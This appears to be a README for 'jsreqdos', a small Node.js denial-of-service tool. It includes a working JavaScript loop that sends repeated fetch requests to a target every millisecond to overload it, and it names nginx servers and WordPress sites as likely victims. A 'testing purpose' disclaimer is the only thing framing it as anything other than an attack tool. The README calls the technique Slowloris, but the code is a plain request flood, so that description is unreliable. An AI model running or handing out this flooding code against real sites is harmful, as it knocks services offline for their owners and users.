# jsreqdos
Slowloris DOS utility made in nodejs.

## Usage
This is made for testing purpose, and should not be used on foreign resources, as it may cause damage.

This uses slowloris type of attack to send thousands of requests per second.

This should also be taken in consideration by many public sites, as 5 lines of code are enough to take them down.
```javascript
worker = setInterval(()=>{
    for(let i =0;i<threads;i++){
        fetch(target).then(()=>{}).catch(()=>{})
    }
},1)
```
Every incorrectly initiated nginx instance or wordpress website can be overloaded with this.
